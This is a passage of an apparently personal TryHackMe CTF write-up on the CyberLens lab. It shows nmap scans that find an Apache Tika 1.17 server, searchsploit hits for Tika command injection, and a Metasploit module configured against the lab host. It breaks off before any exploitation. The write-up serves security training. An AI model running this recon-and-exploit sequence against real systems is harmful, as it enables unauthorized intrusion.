@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Putting it all together — the typical workflow you saw in the transcript | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 75ch; margin: 0 auto; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; }
+        body { background-color: #0f172a; color: #cbd5e1; }
+    </style>
+</head>
+<body class="p-8 md:p-16">
+    <nav class="mb-12"><a href="../index.html" class="text-accent-cyan hover:underline">&larr; Back to Portfolio</a></nav>
+    <article class="max-w-4xl mx-auto">
+        <header class="mb-12">
+            <div class="text-accent-green font-mono text-sm mb-2 uppercase">tryhackme</div>
+            <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">Putting it all together — the typical workflow you saw in the transcript</h1>
+            <div class="text-slate-500 text-sm">2024-12-30 • tryhackme, ctf</div>
+        </header>
+        <div class="markdown-content">
+            <p>target - 10.201.116.26<br />
+Things to Note</p>
+<ol>
+<li>Be sure to add the IP to your /etc/hosts file: <code>sudo echo '10.201.116.26 cyberlens.thm' &gt;&gt; /etc/hosts</code></li>
+<li>Make sure you wait 5 minutes before starting so the VM fully starts each service</li>
+</ol>
+<p>Found somethink run on 61777 port wia website  source cord</p>
+<div class="codehilite"><pre><span></span><code>fetch(&quot;http://cyberlens.thm:61777/meta&quot;, {
+            method: &quot;PUT&quot;,
+            body: fileData,
+            headers: {
+              &quot;Accept&quot;: &quot;application/json&quot;,
+              &quot;Content-Type&quot;: &quot;application/octet-stream&quot;
+            }
+</code></pre></div>
+
+<p>So check that port wia nmap and found tika apache vaulnerbility</p>
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="nx">cyber</span><span class="p">.</span><span class="nx">thm</span>
+<span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2025-10-09 08:32 EDT</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">cyber</span><span class="p">.</span><span class="nx">thm</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.201.116.26</span><span class="p">)</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.36</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">995</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
+<span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span>
+<span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span>
+<span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
+<span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span>
+<span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span>
+<span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">wsman</span>
+
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">27.30</span><span class="w"> </span><span class="nx">seconds</span>
+<span class="err">❯</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="nx">cyber</span><span class="p">.</span><span class="nx">thm</span><span class="w"> </span><span class="o">-</span><span class="nx">p80</span>
+<span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2025-10-09 08:39 EDT</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">cyber</span><span class="p">.</span><span class="nx">thm</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.201.116.26</span><span class="p">)</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.35</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+
+<span class="nx">PORT</span><span class="w">   </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span>
+
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">1.01</span><span class="w"> </span><span class="nx">seconds</span>
+<span class="err">❯</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">p</span><span class="w"> </span><span class="mi">61777</span><span class="w"> </span><span class="o">-</span><span class="nx">sC</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="nx">cyber</span><span class="p">.</span><span class="nx">thm</span><span class="w"> </span><span class="o">-</span><span class="nx">Pn</span><span class="w"> </span><span class="o">-</span><span class="nx">vv</span>
+<span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2025-10-09 08:42 EDT</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Loaded</span><span class="w"> </span><span class="mi">157</span><span class="w"> </span><span class="nx">scripts</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">scanning</span><span class="p">.</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Script</span><span class="w"> </span><span class="nx">Pre</span><span class="o">-</span><span class="nx">scanning</span><span class="p">.</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Starting</span><span class="w"> </span><span class="nx">runlevel</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="nx">scan</span><span class="p">.</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">0.00</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Starting</span><span class="w"> </span><span class="nx">runlevel</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="nx">scan</span><span class="p">.</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">0.00</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Starting</span><span class="w"> </span><span class="nx">runlevel</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="nx">scan</span><span class="p">.</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">0.00</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">SYN</span><span class="w"> </span><span class="nx">Stealth</span><span class="w"> </span><span class="nx">Scan</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Scanning</span><span class="w"> </span><span class="nx">cyber</span><span class="p">.</span><span class="nx">thm</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.201.116.26</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mi">1</span><span class="w"> </span><span class="nx">port</span><span class="p">]</span>
+<span class="nx">Discovered</span><span class="w"> </span><span class="nx">open</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="mi">61777</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="m m-Double">10.201.116.26</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">SYN</span><span class="w"> </span><span class="nx">Stealth</span><span class="w"> </span><span class="nx">Scan</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">0.37</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">total</span><span class="w"> </span><span class="nx">ports</span><span class="p">)</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Scanning</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">cyber</span><span class="p">.</span><span class="nx">thm</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.201.116.26</span><span class="p">)</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">12.38</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="p">)</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Script</span><span class="w"> </span><span class="nx">scanning</span><span class="w"> </span><span class="m m-Double">10.201.116.26</span><span class="p">.</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Starting</span><span class="w"> </span><span class="nx">runlevel</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="nx">scan</span><span class="p">.</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">7.80</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Starting</span><span class="w"> </span><span class="nx">runlevel</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="nx">scan</span><span class="p">.</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">1.67</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Starting</span><span class="w"> </span><span class="nx">runlevel</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="nx">scan</span><span class="p">.</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">0.01</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">cyber</span><span class="p">.</span><span class="nx">thm</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.201.116.26</span><span class="p">)</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="p">,</span><span class="w"> </span><span class="nx">received</span><span class="w"> </span><span class="nx">user</span><span class="o">-</span><span class="nx">set</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.34</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+<span class="nx">Scanned</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">09</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">26</span><span class="w"> </span><span class="nx">EDT</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">22</span><span class="nx">s</span>
+
+<span class="nx">PORT</span><span class="w">      </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">REASON</span><span class="w">          </span><span class="nx">VERSION</span>
+<span class="mi">61777</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">    </span><span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span><span class="w"> </span><span class="nx">ttl</span><span class="w"> </span><span class="mi">125</span><span class="w"> </span><span class="nx">Jetty</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">z</span><span class="o">-</span><span class="nx">SNAPSHOT</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">cors</span><span class="p">:</span><span class="w"> </span><span class="nx">HEAD</span><span class="w"> </span><span class="nx">GET</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Jetty</span><span class="p">(</span><span class="mi">8</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">z</span><span class="o">-</span><span class="nx">SNAPSHOT</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Welcome</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Apache</span><span class="w"> </span><span class="nx">Tika</span><span class="w"> </span><span class="m m-Double">1.17</span><span class="w"> </span><span class="nx">Server</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nx">Supported</span><span class="w"> </span><span class="nx">Methods</span><span class="p">:</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nx">GET</span><span class="w"> </span><span class="nx">PUT</span><span class="w"> </span><span class="nx">OPTIONS</span><span class="w"> </span><span class="nx">HEAD</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">Potentially</span><span class="w"> </span><span class="nx">risky</span><span class="w"> </span><span class="nx">methods</span><span class="p">:</span><span class="w"> </span><span class="nx">PUT</span>
+
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Script</span><span class="w"> </span><span class="nx">Post</span><span class="o">-</span><span class="nx">scanning</span><span class="p">.</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Starting</span><span class="w"> </span><span class="nx">runlevel</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="nx">scan</span><span class="p">.</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">0.00</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Starting</span><span class="w"> </span><span class="nx">runlevel</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="nx">scan</span><span class="p">.</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">0.00</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span>
+<span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">Starting</span><span class="w"> </span><span class="nx">runlevel</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="nx">scan</span><span class="p">.</span>
+<span class="nx">Initiating</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span>
+<span class="nx">Completed</span><span class="w"> </span><span class="nx">NSE</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">42</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">0.00</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span>
+<span class="nx">Read</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">from</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">nmap</span>
+<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">23.17</span><span class="w"> </span><span class="nx">seconds</span>
+<span class="w">           </span><span class="nx">Raw</span><span class="w"> </span><span class="nx">packets</span><span class="w"> </span><span class="nx">sent</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="mi">44</span><span class="nx">B</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">Rcvd</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="mi">44</span><span class="nx">B</span><span class="p">)</span>
+</code></pre></div>
+
+<p>So Use searchploit and found this</p>
+<div class="codehilite"><pre><span></span><code><span class="c">❯ searchsploit Apache Tika</span>
+<span class="nb">-------------------------------------------------------------------------------------------------------------------------</span><span class="c"> </span><span class="nb">---------------------------------</span>
+<span class="c"> Exploit Title                                                                                                           |  Path</span>
+<span class="nb">-------------------------------------------------------------------------------------------------------------------------</span><span class="c"> </span><span class="nb">---------------------------------</span>
+<span class="c">Apache Tika 1</span><span class="nt">.</span><span class="c">15 </span><span class="nb">-</span><span class="c"> 1</span><span class="nt">.</span><span class="c">17 </span><span class="nb">-</span><span class="c"> Header Command Injection (Metasploit)                                                          | windows/remote/47208</span><span class="nt">.</span><span class="c">rb</span>
+<span class="c">Apache Tika</span><span class="nb">-</span><span class="c">server </span><span class="nv">&lt;</span><span class="c"> 1</span><span class="nt">.</span><span class="c">18 </span><span class="nb">-</span><span class="c"> Command Injection                                                                            | windows/remote/46540</span><span class="nt">.</span><span class="c">py</span>
+<span class="nb">-------------------------------------------------------------------------------------------------------------------------</span><span class="c"> </span><span class="nb">---------------------------------</span>
+<span class="c">Shellcodes: No Results</span>
+</code></pre></div>
+
+<p>So use msfconsole</p>
+<div class="codehilite"><pre><span></span><code><span class="n">msf</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">apache_tika_jp2_jscript</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">options</span>
+
+<span class="k">Module</span><span class="w"> </span><span class="nn">options</span><span class="w"> </span><span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">apache_tika_jp2_jscript</span><span class="p">):</span>
+
+<span class="w">   </span><span class="n">Name</span><span class="w">       </span><span class="n">Current</span><span class="w"> </span><span class="n">Setting</span><span class="w">  </span><span class="n">Required</span><span class="w">  </span><span class="n">Description</span>
+<span class="w">   </span><span class="o">----</span><span class="w">       </span><span class="o">---------------</span><span class="w">  </span><span class="o">--------</span><span class="w">  </span><span class="o">-----------</span>
+<span class="w">   </span><span class="n">Proxies</span><span class="w">                     </span><span class="n">no</span><span class="w">        </span><span class="n">A</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="n">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="o">[</span><span class="p">,</span><span class="n">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="o">][</span><span class="p">...</span><span class="o">]</span><span class="p">.</span><span class="w"> </span><span class="n">Supported</span><span class="w"> </span><span class="n">proxies</span><span class="p">:</span><span class="w"> </span><span class="n">sapni</span><span class="p">,</span><span class="w"> </span><span class="n">socks4</span><span class="p">,</span><span class="w"> </span><span class="n">socks5</span><span class="p">,</span><span class="w"> </span><span class="n">http</span><span class="p">,</span><span class="w"> </span><span class="n">so</span>
+<span class="w">                                         </span><span class="n">cks5h</span>
+<span class="w">   </span><span class="n">RHOSTS</span><span class="w">     </span><span class="n">cyber</span><span class="p">.</span><span class="n">thm</span><span class="w">        </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">host</span><span class="p">(</span><span class="n">s</span><span class="p">),</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="p">.</span><span class="n">metasploit</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">docs</span><span class="o">/</span><span class="k">using</span><span class="o">-</span><span class="n">metasploit</span><span class="o">/</span><span class="n">basics</span><span class="o">/</span><span class="k">using</span><span class="o">-</span><span class="n">metasploit</span><span class="p">.</span><span class="n">html</span>
+<span class="w">   </span><span class="n">RPORT</span><span class="w">      </span><span class="mi">61777</span><span class="w">            </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
+<span class="w">   </span><span class="n">SSL</span><span class="w">        </span><span class="k">false</span><span class="w">            </span><span class="n">no</span><span class="w">        </span><span class="n">Negotiate</span><span class="w"> </span><span class="n">SSL</span><span class="o">/</span><span class="n">TLS</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">outgoing</span><span class="w"> </span><span class="n">connections</span>
+<span class="w">   </span><span class="n">SSLCert</span><span class="w">                     </span><span class="n">no</span><span class="w">        </span><span class="n">Path</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">custom</span><span class="w"> </span><span class="n">SSL</span><span class="w"> </span><span class="n">certificate</span><span class="w"> </span><span class="p">(</span><span class="k">default</span><span class="w"> </span><span class="ow">is</span><span class="w"> </span><span class="n">randomly</span><span class="w"> </span><span class="n">generated</span><span class="p">)</span>
+<span class="w">   </span><span class="n">TARGETURI</span><span class="w">  </span><span class="o">/</span><span class="w">                </span><span class="n">yes</span><span class="w">       </span><span class="n">The</span><span class="w"> </span><span class="n">base</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">application</span>
